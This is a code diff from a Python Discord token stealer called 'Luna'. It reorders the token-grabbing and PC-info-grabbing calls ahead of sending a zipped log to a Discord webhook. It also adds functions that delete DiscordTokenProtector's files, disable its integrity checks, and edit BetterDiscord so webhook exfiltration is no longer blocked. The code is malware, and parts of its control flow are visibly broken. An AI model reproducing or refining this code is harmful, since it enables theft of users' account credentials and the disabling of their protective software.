@@ -46,21 +46,21 @@ def main(webhook: str):
 
     zipup()
     startup()
-
+    grabpcinfo()
+    grabtokens()
+    
     _file = None
     _file = File(f'{local}\\Luna-Logged-{os.getenv("Username")}.zip')
 
     content = ""
-    if __PING__:
-        if __PINGTYPE__ == "everyone":
+    if __PING__ and __PINGTYPE__ == "everyone":
             content += "@everyone"
-        elif __PINGTYPE__ == "here":
+        elif __PING__ and __PINGTYPE__ == "here":
             content += "@here"
+   else:
+       __PINGTYPE__ == ""
 
     webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
-    
-    grabpcinfo()
-    grabtokens()
 
 def Luna(webhook: str):
     debug()
@@ -93,6 +93,54 @@ def startup():
         hide()
     except Exception:
         pass
+    
+def bypassTokenProtector():
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        if not ntpath.exists(tp):
+            return
+        config = tp + "config.json"
+
+        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+            try:
+                os.remove(tp + i)
+            except FileNotFoundError:
+                pass
+        if ntpath.exists(config):
+            with open(config, errors="ignore") as f:
+                try:
+                    item = json.load(f)
+                except json.decoder.JSONDecodeError:
+                    return
+                item['e'] = "None"
+                item['auto_start'] = False
+                item['auto_start_discord'] = False
+                item['integrity'] = False
+                item['integrity_allowbetterdiscord'] = False
+                item['integrity_checkexecutable'] = False
+                item['integrity_checkhash'] = False
+                item['integrity_checkmodule'] = False
+                item['integrity_checkscripts'] = False
+                item['integrity_checkresource'] = False
+                item['integrity_redownloadhashes'] = False
+                item['iterations_iv'] = 364
+                item['iterations_key'] = 457
+                item['version'] = 69420
+            with open(config, 'w') as f:
+                json.dump(item, f, indent=2, sort_keys=True)
+
+def bypassBetterDiscord():
+    bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
+    if ntpath.exists(bd):
+        hook_reg = "api/webhooks"
+        x = hook_reg
+        with open(bd, 'r', encoding="cp437", errors='ignore') as f:
+            txt = f.read()
+            content = txt.replace(x, 'e')
+            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
+                f.write(content)
+                
+bypassTokenProtector()
+bypassBetterDiscord()
 
 class grabpcinfo():
     def __init__(self) -> None:
